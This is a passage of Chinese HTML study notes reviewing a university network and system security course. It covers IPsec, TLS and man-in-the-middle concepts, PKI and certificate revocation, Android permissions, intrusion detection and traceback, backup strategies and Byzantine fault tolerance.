Mechanism（ACM）收到主体的访问控制请求；</li>\n<li>根据Policy检查主体属性、客体属性以及环境条件；</li>\n<li>决定主体对客体的操作是否允许。</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"传统访问控制与ABAC联系\"><a href=\"#传统访问控制与ABAC联系\" class=\"headerlink\" title=\"传统访问控制与ABAC联系\"></a>传统访问控制与ABAC联系</h5><p>基于身份的访问控制和RBAC可以看作是 ABAC的一个特例，角色也可以看作是一个属性，从而将角色的访问控制策略转换成属性规则。</p>\n<h5 id=\"基于属性的策略\"><a href=\"#基于属性的策略\" class=\"headerlink\" title=\"基于属性的策略\"></a>基于属性的策略</h5><p>ABAC属性管理主要完成属性的命名、定义、取值范围确定以及与主体和客体绑定等。主体属性一般由属性管理机构提供，如果不同机构的主体存在访问需求，需要在不同机构之间建立属性映射机制。</p>\n<h1 id=\"第五次课：网络边界与防护\"><a href=\"#第五次课：网络边界与防护\" class=\"headerlink\" title=\"第五次课：网络边界与防护\"></a>第五次课：网络边界与防护</h1><p>ipsec可以支持ip层所有流量的加密和&#x2F;或鉴别,因此可以增强所有分布式应用的安全性</p>\n<h2 id=\"5-1-IPSEC协议的两个基本协议：\"><a href=\"#5-1-IPSEC协议的两个基本协议：\" class=\"headerlink\" title=\"5.1 IPSEC协议的两个基本协议：\"></a>5.1 IPSEC协议的两个基本协议：</h2><ul>\n<li><p><strong>鉴别头协议 AH ：</strong>AH协议提供数据源认证、数据完整性校验和报文防重放功能， 但不提供机密性。</p>\n<p>数据源身份验证：计算验证码时加入一个共享密钥（HMAC） </p>\n<p>完整性验证：通过杂凑函数产生的校验值 </p>\n<p>AH报头中的序列号防止重放攻击</p>\n<p><img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106130903382.png\" alt=\"image-20230106130903382\"></p>\n</li>\n<li><p><strong>有效载荷封装协议ESP：</strong>提供了除了AH认证头协议的所有功能外，还可以对IP报文净荷进行加密。</p>\n<p><img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106130959906.png\" alt=\"image-20230106130959906\"></p>\n</li>\n</ul>\n<p>IPSec通过AH和ESP这两个安全协议来实现IP数据报的安全传输。AH和ESP可以单独使用，也可同时使用。AH和ESP同时使用时，报文在IPSec安全转换时，先进行ESP封装，再进行AH封装；IPSec解封装时，先进行AH解封装，再进行ESP解封装。</p>\n<img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106130821697.png\" alt=\"image-20230106130821697\" style=\"zoom:25%;\">\n\n<h2 id=\"5-2-IPSEC-的两个工作模式：\"><a href=\"#5-2-IPSEC-的两个工作模式：\" class=\"headerlink\" title=\"5.2 IPSEC 的两个工作模式：\"></a>5.2 IPSEC 的两个工作模式：</h2><p><img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106131118158.png\" alt=\"image-20230106131118158\"></p>\n<ul>\n<li><strong>传输模式：</strong>在传输模式下，AH或ESP被插入到IP头之后但在传输层协议之前。</li>\n</ul>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2022/png/34463897/1672468514015-1391d50f-6255-4eda-b677-0f54e9b5db06.png\" alt=\"img\"></p>\n<ul>\n<li><strong>隧道模式：</strong>在隧道模式下，AH或ESP在原始IP头前，另外生成一个新的IP 头放到AH或ESP之前。</li>\n</ul>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2022/png/34463897/1672468533403-b0dd5f4d-a558-4ec4-99c1-1538c536718b.png\" alt=\"img\"></p>\n<h4 id><a href=\"#\" class=\"headerlink\" title></a></h4><h2 id=\"5-3-TLS协议握手过程、中间人攻击；\"><a href=\"#5-3-TLS协议握手过程、中间人攻击；\" class=\"headerlink\" title=\"5.3 TLS协议握手过程、中间人攻击；\"></a>5.3 TLS协议握手过程、中间人攻击；</h2><p>四个阶段,握手是干什么的,怎么完成身份鉴别,密钥协商,安全的通道</p>\n<h3 id=\"握手过程\"><a href=\"#握手过程\" class=\"headerlink\" title=\"握手过程\"></a>握手过程</h3><p><a href=\"http://www.ruanyifeng.com/blog/2014/02/ssl_tls.html\">http://www.ruanyifeng.com/blog/2014/02/ssl_tls.html</a></p>\n<img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106132118156.png\" alt=\"image-20230106132118156\" style=\"zoom:25%;\">\n\n<h3 id=\"中间人攻击\"><a href=\"#中间人攻击\" class=\"headerlink\" title=\"中间人攻击\"></a>中间人攻击</h3><p><img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105165056738.png\" alt=\"image-20230105165056738\"></p>\n<p>能够通过ARP 欺骗、DNS 欺骗或者浏览器数据重定向等欺骗技术， 使得SSL客户端C和服务器端S的数据都流向SSL MITM攻击机M。</p>\n<p>SSL客户端用户在接收到SSL MITM攻击机伪造的数字证书后， 被骗取对该证书的信任， 并继续SSL连接。</p>\n<p>SSL服务器未要求进行SSL客户端身份鉴别。</p>\n<h2 id=\"5-4-VPN基本原理\"><a href=\"#5-4-VPN基本原理\" class=\"headerlink\" title=\"5.4 VPN基本原理\"></a>5.4 VPN基本原理</h2><p>VPN虚拟专用网络，是依靠ISP和其他的NSP，在公共网络中建立专用的数据通信的网络技术，可以为企业之间或者个人与企业之间提供安全的数据传输隧道服务。</p>\n<p>在VPN中任意两点之间的链接并没有传统专网所需的端到端的物理链路，而是利用公共网络资源动态组成的，可以理解为通过私有的隧道技术在公共数据网络上模拟出来的和专网有同样功能的点到点的专线技术。</p>\n<p>VPN涉及的安全技术：加解密技术、身份鉴别技术、密钥管理技术</p>\n<h2 id=\"VPN技术在TLS和IPSEC层面实现\"><a href=\"#VPN技术在TLS和IPSEC层面实现\" class=\"headerlink\" title=\"VPN技术在TLS和IPSEC层面实现\"></a>VPN技术在TLS和IPSEC层面实现</h2><p>IPSEC过程：1、主机或网关B向远程主机或网关A发送VPN建立请求；2、A产生一个随机数，并将其发送给B；3、B使用这个随机数加密预先通过IKE分享的密钥，将结果发送给A；4、A也使用该随机数将B发来的结果解密，与预先分享的密钥比较，如果匹配，则使用这个密钥加密公钥，发送给B；5、B使用该公钥来建立它与A之间的IPSec SA，VPN隧道建立。</p>\n<img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106155322339.png\" alt=\"image-20230106155322339\" style=\"zoom:25%;\">\n\n<h2 id=\"5-5-防火墙基本原理\"><a href=\"#5-5-防火墙基本原理\" class=\"headerlink\" title=\"5.5 防火墙基本原理\"></a>5.5 防火墙基本原理</h2><p>​\t了解几种防火墙的基本原理和特性</p>\n<p>防火墙是位于两个(或多个)网络间， 实施网间访问控制的一组组件的集合， 内部和外部之间的所有网络数据流必须经过防火墙，只有符合安全政策的数据流才能通过防火墙。防火墙利用包过滤技术、状态检测技术、应用级网关技术、代理服务器技术等来挡住未经授权的访问流量，禁止具有脆弱性的服务带来危害。防火墙实施保护， 以避免各种IP欺骗和路由攻击。</p>\n<h1 id=\"第六次课：网络权限管理\"><a href=\"#第六次课：网络权限管理\" class=\"headerlink\" title=\"第六次课：网络权限管理\"></a>第六次课：网络权限管理</h1><h2 id=\"PMI（Privilege-Management-Infrastructure，权限管理基础设施）中SOA、AA等实体的作用\"><a href=\"#PMI（Privilege-Management-Infrastructure，权限管理基础设施）中SOA、AA等实体的作用\" class=\"headerlink\" title=\"PMI（Privilege Management Infrastructure，权限管理基础设施）中SOA、AA等实体的作用\"></a>PMI（Privilege Management Infrastructure，权限管理基础设施）中SOA、AA等实体的作用</h2><p>在PMI里资源拥有者称为<strong>SOA</strong> (Source of Authority), 被授权的实体称为<strong>Privilege Holder</strong>。Privilege holder还可以将他的权限进一步的委托，此时的Privilege holder就变成 了<strong>AA</strong>(Attribute Authority )，需要注意，在这个过程中，权限授予是有层次级别的：SOA -&gt; PH(AA)。这个过程不能反转。</p>\n<img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105103406935.png\" alt=\"image-20230105103406935\" style=\"zoom:50%;\">\n\n<img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105103506381.png\" alt=\"image-20230105103506381\" style=\"zoom:50%;\">\n\n<img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105103835548.png\" alt=\"image-20230105103835548\" style=\"zoom:50%;\">\n\n<h2 id=\"基于属性的访问控制与PMI的关系\"><a href=\"#基于属性的访问控制与PMI的关系\" class=\"headerlink\" title=\"基于属性的访问控制与PMI的关系\"></a>基于属性的访问控制与PMI的关系</h2><p>PMI的属性证书AC绑定了实体身份信息和实体权限。属性证书由属性中心AA以数字签名的方式签发，给出了实体的权限属性。实体向AA申请一个权限，申请通过后，属性中心AA只将AC发送给实体本身，公开存储或交由验证者验证，这个过程并不需要实体本身知晓或参与。</p>\n<h2 id=\"PKI的基本概念-包括数字证书的生命周期、CRL、OCSP\"><a href=\"#PKI的基本概念-包括数字证书的生命周期、CRL、OCSP\" class=\"headerlink\" title=\"PKI的基本概念,包括数字证书的生命周期、CRL、OCSP\"></a>PKI的基本概念,包括数字证书的生命周期、CRL、OCSP</h2><ul>\n<li>数字证书的生命周期：数字证书的全生命周期包括<code>证书的申请、签发、获取、验证和撤销</code>。</li>\n</ul>\n<p>某个用户想要生成一对密钥就会向CA申请一个公钥的数字证书，CA通过签发证书的方式向全世界发布申请人的公钥信息。该证书以各种方式公开(HTTP&#x2F;FTP&#x2F;LDAP&#x2F;Email等)，所有取得该公钥数字证书的用户会鉴别数据源、数据完整性，同时CA还需要有非否认性。CA办法的数字证书具有有效期，过期后，该证书无效，此时不能再使用该公钥，CA需要撤销该证书。</p>\n<ul>\n<li>数字证书无效以后，CA要撤销该证书，此时PKI会维护一个证书撤销列表CRL，证书撤销列表也要CA进行数字签名，以实现数据完整性、数据源鉴别、非否认。CRL中保存着被撤销的证书序列号。</li>\n<li>在线证书状态协议OCSP是另一种形式的证书撤销信息，其形式是“请求－应答”，即请求某个序列号的证书当前状态如何？应答则分为“未撤销、撤销、未知”状态，应答消息需要服务器的数字签名。</li>\n</ul>\n<h3 id=\"为什么会有PKI-Public-Key-Infrastructure\"><a href=\"#为什么会有PKI-Public-Key-Infrastructure\" class=\"headerlink\" title=\"为什么会有PKI(Public Key Infrastructure)\"></a>为什么会有PKI(Public Key Infrastructure)</h3><p>安全通信的前提:双方能够共享一个对称密钥用作会话密钥</p>\n<p>会话密钥通常由公钥密码协商得到,如Diffie-Hellman密钥交换</p>\n<p>但是如何安全地知道对方的密钥呢?? 建立具有公信力的可信第三方!</p>\n<h3 id=\"PKI的基本概念\"><a href=\"#PKI的基本概念\" class=\"headerlink\" title=\"PKI的基本概念\"></a>PKI的基本概念</h3><img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105101927108.png\" alt=\"image-20230105101927108\" style=\"zoom:50%;\">\n\n<img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105102009133.png\" alt=\"image-20230105102009133\" style=\"zoom:50%;\">\n\n<h3 id=\"CRL-证书撤销列表\"><a href=\"#CRL-证书撤销列表\" class=\"headerlink\" title=\"CRL 证书撤销列表\"></a>CRL 证书撤销列表</h3><p><img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105102716999.png\" alt=\"image-20230105102716999\"></p>\n<h3 id=\"OCSP-证书撤销方式\"><a href=\"#OCSP-证书撤销方式\" class=\"headerlink\" title=\"OCSP 证书撤销方式\"></a>OCSP 证书撤销方式</h3><img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105103010693.png\" alt=\"image-20230105103010693\" style=\"zoom:50%;\">\n\n\n\n<p><img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105104157260.png\" alt=\"image-20230105104157260\"></p>\n<h1 id=\"第七次课：系统权限管理\"><a href=\"#第七次课：系统权限管理\" class=\"headerlink\" title=\"第七次课：系统权限管理\"></a>第七次课：系统权限管理</h1><h2 id=\"移动终端系统与传统PC权限管理需求的区别。\"><a href=\"#移动终端系统与传统PC权限管理需求的区别。\" class=\"headerlink\" title=\"移动终端系统与传统PC权限管理需求的区别。\"></a>移动终端系统与传统PC权限管理需求的区别。</h2><p>什么什么hold???</p>\n<p>传统PC强调“作为一个完整系统独立提供服务”的能力，传统PC系统安全设计为：一个用户登录后，针对该系统用户进行系统资源的访问控制。移动应用高度依赖网络，每一个应用背后是一个相对独立的网络应用系统，每一个应用有自己相对独立的安全边界。移动终端系统用户个人属性相对明显，很少有多人共享一个终端设备，用户区分标识（UID）不再是移动终端系统进行资源访问控制的合适依据。</p>\n<p>APP作为系统资源访问控制的基本单位，不同APP之间需要能够进行有效隔离，系统对不同用户的区分不再明显。</p>\n<p><img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105091924282.png\" alt=\"image-20230105091924282\"><img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105092017837.png\" alt=\"image-20230105092017837\"></p>\n<h2 id=\"Android-Permission机制与Linux-UGO访问控制的区别与联系。\"><a href=\"#Android-Permission机制与Linux-UGO访问控制的区别与联系。\" class=\"headerlink\" title=\"Android Permission机制与Linux UGO访问控制的区别与联系。\"></a>Android Permission机制与Linux UGO访问控制的区别与联系。</h2><p>什么curi ablitiy?</p>\n<p>Android APP在其进程建立过程中形成实际的APP Permission授权，Linux UGO和ACL在文件系统加载时形成文件的权限属性。Android Permission机制本质上是代码签名机制后，对APP权限的进一步访问控制。UGO机制设置不同组的访问权限，通过让用户进程加入到不同的组，实现其访问控制。</p>\n<h2 id=\"Android-Permission机制实现的基本组件和流程。\"><a href=\"#Android-Permission机制实现的基本组件和流程。\" class=\"headerlink\" title=\"Android Permission机制实现的基本组件和流程。\"></a>Android Permission机制实现的基本组件和流程。</h2><ul>\n<li><strong>APP Permission的申请与生成</strong>：每个APP拥有 Permission授权的能力，基于能力的访问控制机制适用于需要区分用户较多的环境，Android系统里每一个APP就是一个用户。基于能力的访问控制机制，访问权限的撤销较为困难，因为访问许可授权分散在每一个APP中。</li>\n<li><strong>APP Permission授权的形成</strong>：Android APP在其进程建立过程中形成实际的APP Permission授权，在APP运行加载时，从静态存储被加载到APP的进程空间。</li>\n<li><strong>APP Permission权限检查</strong>：当APP访问系统资源时，Android系统会检查APP的权限信息。APP通过系统提供的API调用系统资源，API由System Server和Media等几个关键的进程提供。System Server提供PermCheck功能，PermCheck对比资源要求的Permission许可和 APP存储在mExtras中的许可，进行访问控制决策。</li>\n</ul>\n<h1 id=\"第八次课：入侵检测基本原理\"><a href=\"#第八次课：入侵检测基本原理\" class=\"headerlink\" title=\"第八次课：入侵检测基本原理\"></a>第八次课：入侵检测基本原理</h1><h2 id=\"8-1-PDR模型的时间关系\"><a href=\"#8-1-PDR模型的时间关系\" class=\"headerlink\" title=\"8.1 PDR模型的时间关系\"></a>8.1 PDR模型的时间关系</h2><p>以时间为度量指标，量化描述系统攻击和防御的对抗，著名的安全条件如下： Pt &gt; Dt + Rt</p>\n<img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105113008104.png\" alt=\"image-20230105113008104\" style=\"zoom:33%;\">\n\n\n\n<img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105113132134.png\" alt=\"image-20230105113132134\" style=\"zoom: 33%;\">\n\n<h2 id=\"8-2-入侵检测-IDS-的技术起源，安全审计\"><a href=\"#8-2-入侵检测-IDS-的技术起源，安全审计\" class=\"headerlink\" title=\"8.2 入侵检测(IDS)的技术起源，安全审计\"></a>8.2 入侵检测(IDS)的技术起源，安全审计</h2><h3 id=\"技术起源\"><a href=\"#技术起源\" class=\"headerlink\" title=\"技术起源\"></a>技术起源</h3><img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105113507224.png\" alt=\"image-20230105113507224\" style=\"zoom: 33%;\">\n\n<h3 id=\"安全审计\"><a href=\"#安全审计\" class=\"headerlink\" title=\"安全审计\"></a>安全审计</h3><p>计算机网络安全审计（Audit）是指按照一定的安全策略，利用记录、系统活动和用户活动等信息，检查、审查和检验操作事件的环境及活动，从而发现系统漏洞、入侵行为或改善系统性能的过程。</p>\n<p>也是审查评估系统安全风险并采取相应措施的一个过程。在不至于混淆情况下，简称为安全审计，实际是记录与审查用户操作计算机及网络系统活动的过程，是提高系统安全性的重要举措。系统活动包括操作系统活动和应用程序进程的活动。</p>\n<h2 id=\"8-3-异常入侵检测和误用入侵检测的区别和联系\"><a href=\"#8-3-异常入侵检测和误用入侵检测的区别和联系\" class=\"headerlink\" title=\"8.3 异常入侵检测和误用入侵检测的区别和联系\"></a>8.3 异常入侵检测和误用入侵检测的区别和联系</h2><h3 id=\"误用入侵检测系统\"><a href=\"#误用入侵检测系统\" class=\"headerlink\" title=\"误用入侵检测系统\"></a>误用入侵检测系统</h3><p>误用入侵检测的前提是入侵行为和正常行为是可区分的。建立一个异常行为的模式库</p>\n<img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105113654551.png\" alt=\"image-20230105113654551\" style=\"zoom: 33%;\">\n\n<h3 id=\"异常入侵检测\"><a href=\"#异常入侵检测\" class=\"headerlink\" title=\"异常入侵检测\"></a>异常入侵检测</h3><p>这个是记录正常的行为,不在这个范围内的被判定为异常</p>\n<p>异常入侵检测记录用户的的日常操作，一般而言，误用检测的<code>新特征发现过程</code>与使用<code>已有特征进行检测的过程</code>相互独立。</p>\n<img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105114015471.png\" alt=\"image-20230105114015471\" style=\"zoom:33%;\">\n\n<h3 id=\"区别和联系\"><a href=\"#区别和联系\" class=\"headerlink\" title=\"区别和联系\"></a>区别和联系</h3><p>异常IDS检测&#x2F;误用IDS检测，都有更新“特征&#x2F;模式库”的行为。一般而言，误用检测的<code>新特征发现过程</code>与<code>使用已有特征进行检测的过程</code>相互独立；异常检测的模式库更新，通常是在IDS的运行中完成，即边运行，边更新。</p>\n<h2 id=\"思考题\"><a href=\"#思考题\" class=\"headerlink\" title=\"思考题\"></a>思考题</h2><img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105114231965.png\" alt=\"image-20230105114231965\" style=\"zoom:33%;\">\n\n<h1 id=\"第九次课：\"><a href=\"#第九次课：\" class=\"headerlink\" title=\"第九次课：\"></a>第九次课：</h1><h2 id=\"9-1-入侵相应的目标\"><a href=\"#9-1-入侵相应的目标\" class=\"headerlink\" title=\"9.1 入侵相应的目标\"></a>9.1 入侵相应的目标</h2><p>对危及安全的事件、行为、过程及时做出响应处理，杜绝危害蔓延，降低安全影响。</p>\n<p>核心是业务连续性, 要保证这个,让攻击的范围减小,危害最小</p>\n<h2 id=\"9-2-入侵追踪的基本技术\"><a href=\"#9-2-入侵追踪的基本技术\" class=\"headerlink\" title=\"9.2 入侵追踪的基本技术\"></a>9.2 入侵追踪的基本技术</h2><p>溯源</p>\n<h5 id=\"阻断攻击\"><a href=\"#阻断攻击\" class=\"headerlink\" title=\"阻断攻击\"></a>阻断攻击</h5><ul>\n<li>与防火墙或网关联动，阻断攻击者的TCP连接(TCP RESET)、阻断攻击者的数据包(ICMP 报文控制)；</li>\n<li>联络攻击者所在区域的管理员；</li>\n<li>向攻击者发起反击：网络流量的压制性反击、基于安全漏洞利用的反击、基于APT方式的反击。</li>\n</ul>\n<h5 id=\"收集攻击信息\"><a href=\"#收集攻击信息\" class=\"headerlink\" title=\"收集攻击信息\"></a>收集攻击信息</h5><p>检测到入侵后，把攻击者引导到经过特殊装 备的诱骗服务器上，记录攻击者的行为，从而获得攻击者的详细信息，作为进一步采取法律措施的证据。主要包括：Honey Pot(蜜罐)、Decoy(诱骗系统)、Fishbowl(鱼饵)等技术。</p>\n<h5 id=\"入侵追踪\"><a href=\"#入侵追踪\" class=\"headerlink\" title=\"入侵追踪\"></a>入侵追踪</h5><p>入侵追踪是一种分布式的、需要多节点协作的体系；入侵追踪应该建立在网络资源相互信任的基础上，应该具有抵抗攻击的健壮性，入侵追踪必须是高效的、准确的，统能够以最小的代价提供快速响应机制。</p>\n<ul>\n<li><p><strong>基于主机的追踪体系</strong>：每一个主机节点利用信息隐藏技术在数据包中留下不易察觉的标记、都留下日志，追踪系统中的每一个节点都必须是信任的。</p>\n</li>\n<li><p><strong>针对TCP连接链的追踪</strong>：对于中间经过了多次跳板的TCP攻击连接，一般通过全网部署多个监控节点，监控TCP流。</p>\n</li>\n<li><p><strong>网络追踪技术：</strong></p>\n</li>\n<li><ul>\n<li><p>Input Debugging：发生攻击后IDS发现攻击数据包，人工联系前面的各个路由器。</p>\n</li>\n<li><p>Controlled Flooding：逐一地向前面的各个路由器发送数据、淹没路由器的缓冲区，看看攻击流量是否减少。</p>\n</li>\n<li><p><strong>ICMP追踪：</strong>利用路由器配合确定数据包转发经过的路由器。</p>\n</li>\n<li><p><strong>PPM技术：</strong>每一个数据包每经过一个路由器，路由器就把自己的IP地址附加上去。</p>\n</li>\n<li><p><strong>基于日志 的追踪：</strong>由路由器计算并保存每个数据包的Hash摘要。入侵追踪时，通过检查数据包的Hash摘要，与路由器保存的结果进行比较，逐步查询出整个攻击路径所经过的路由器。</p>\n</li>\n</ul>\n</li>\n<li><img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105212128645.png\" alt=\"image-20230105212128645\" style=\"zoom:25%;\"></li>\n</ul>\n<h2 id=\"9-3-APT-攻击对入侵检测与响应的影响\"><a href=\"#9-3-APT-攻击对入侵检测与响应的影响\" class=\"headerlink\" title=\"9.3 APT 攻击对入侵检测与响应的影响\"></a>9.3 APT 攻击对入侵检测与响应的影响</h2><p><strong>Advanced Persistent Threat</strong> </p>\n<p>APT是由商业或者政治目的，针对特定目标的攻击。隐蔽性和持续性是攻击的主要特点，APT攻击采用尽可能正常的网络行为，通过长期有耐心的积累实施攻击。APT攻击的监测超出了“误用”和“异常”IDS的能力范围，使得入侵检测和响应变得更加困难。 </p>\n<h2 id=\"思考题-1\"><a href=\"#思考题-1\" class=\"headerlink\" title=\"思考题\"></a>思考题</h2><img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105212629466.png\" alt=\"image-20230105212629466\" style=\"zoom:50%;\">\n\n<h1 id=\"第十次课：数据备份与灾难恢复\"><a href=\"#第十次课：数据备份与灾难恢复\" class=\"headerlink\" title=\"第十次课：数据备份与灾难恢复\"></a>第十次课：数据备份与灾难恢复</h1><p>PDRR模型,加入了一个R, restore&#x2F;recovery,核心也是 业务连续性</p>\n<p>R代表Restore –即一旦系统遭到破坏，将采取一系列的措施如备份文件恢复、系统重置等功能，恢复系统服务。</p>\n<h2 id=\"10-1-应急计划的概念\"><a href=\"#10-1-应急计划的概念\" class=\"headerlink\" title=\"10.1 应急计划的概念\"></a>10.1 应急计划的概念</h2><p>一个组织具备承受各种灾难，并在灾难引起环境变化中，保持主要任务顺利运行的能力</p>\n<h2 id=\"10-2-业务连续性计划的概念，以及业务连续性计划与应急计划的区别和联系\"><a href=\"#10-2-业务连续性计划的概念，以及业务连续性计划与应急计划的区别和联系\" class=\"headerlink\" title=\"10.2 业务连续性计划的概念，以及业务连续性计划与应急计划的区别和联系\"></a>10.2 业务连续性计划的概念，以及业务连续性计划与应急计划的区别和联系</h2><p>在应急计划的基础上，通过制定业务连续性计划Business Continuity Plan (BCP)实现在故障或灾难中业务的恢复和保持。</p>\n<p>国际通行的做法是通过制定应急计划和业务连续性计划，确保系统在遭受灾难时，确保主要业务的正常运行.连续性计划和应急计划是应急管理的重要组成部分。连续性计划适用于组织业务自身；应急计划适用于支撑业务运行的信息系统。连续性计划是目标，应急计划是支撑。</p>\n<h2 id=\"10-3-容灾备份系统的度量指标：-RPO，-RTO，-NRO-和-DOO\"><a href=\"#10-3-容灾备份系统的度量指标：-RPO，-RTO，-NRO-和-DOO\" class=\"headerlink\" title=\"10.3 容灾备份系统的度量指标： RPO， RTO， NRO 和 DOO\"></a>10.3 容灾备份系统的度量指标： RPO， RTO， NRO 和 DOO</h2><p>以恢复点为目标RPO（Recovery Point Object）；</p>\n<p>以恢复时间为目标RTO（Recovery Time Object） ；</p>\n<p>以网络恢复为目标NRO（Network Recovery Object） ；</p>\n<p>以服务支持能力保证为目标DOO （Serviceability Degrade Object） (降级运作目标)</p>\n<h2 id=\"10-4-数据备份策略的区别和联系：完全备份、增量备份和差量备份\"><a href=\"#10-4-数据备份策略的区别和联系：完全备份、增量备份和差量备份\" class=\"headerlink\" title=\"10.4 数据备份策略的区别和联系：完全备份、增量备份和差量备份\"></a>10.4 数据备份策略的区别和联系：完全备份、增量备份和差量备份</h2><p>完全备份：对系统进行完全备份，优点是直观，缺点是数据重复量大，成本高，效率低</p>\n<p>增量备份：只备份上一次备份后数据的改变量，优点数据重复量少，节约空间，缩短时间，缺点，可靠性差，各个备份环环相连，任何一环出问题，都会影响整个备份链</p>\n<p> 差量备份：差量备份的数据是上一次全备份之后新增加和修改过的数据，例如每周周一全备份，之后差量备份，兼具前两者的优点</p>\n<h2 id=\"思考题-2\"><a href=\"#思考题-2\" class=\"headerlink\" title=\"思考题\"></a>思考题</h2><p><img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105220902684.png\" alt=\"image-20230105220902684\"></p>\n<h1 id=\"第十一次课：拜占庭容错系统\"><a href=\"#第十一次课：拜占庭容错系统\" class=\"headerlink\" title=\"第十一次课：拜占庭容错系统\"></a>第十一次课：拜占庭容错系统</h1><h2 id=\"11-1-n-x3D-4，m-x3D-1，口头消息的拜占庭消息协商过程；\"><a href=\"#11-1-n-x3D-4，m-x3D-1，口头消息的拜占庭消息协商过程；\" class=\"headerlink\" title=\"11.1 n&#x3D;4，m&#x3D;1，口头消息的拜占庭消息协商过程；\"></a>11.1 n&#x3D;4，m&#x3D;1，口头消息的拜占庭消息协商过程；</h2><p><a href=\"https://blog.csdn.net/xuyuzhuang1991/article/details/79638051\">https://blog.csdn.net/xuyuzhuang1991/article/details/79638051</a></p>\n<h2 id=\"11-2-masking-BQS的容错条件，及其一致性过程分析\"><a href=\"#11-2-masking-BQS的容错条件，及其一致性过程分析\" class=\"headerlink\" title=\"11.2 masking BQS的容错条件，及其一致性过程分析\"></a>11.2 masking BQS的容错条件，及其一致性过程分析</h2><p>​    假设：</p>\n<img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106163643143.png\" alt=\"image-20230106163643143\" style=\"zoom:25%;\">\n\n\n\n<p>​        在BQS中，由于无法区分信道&#x2F;服务器失效，同一归结到服务器失效</p>\n<p>​        Reliable but Asynchronous（异步）：保证可以传输到达，但不对传输时间做保证</p>\n<img 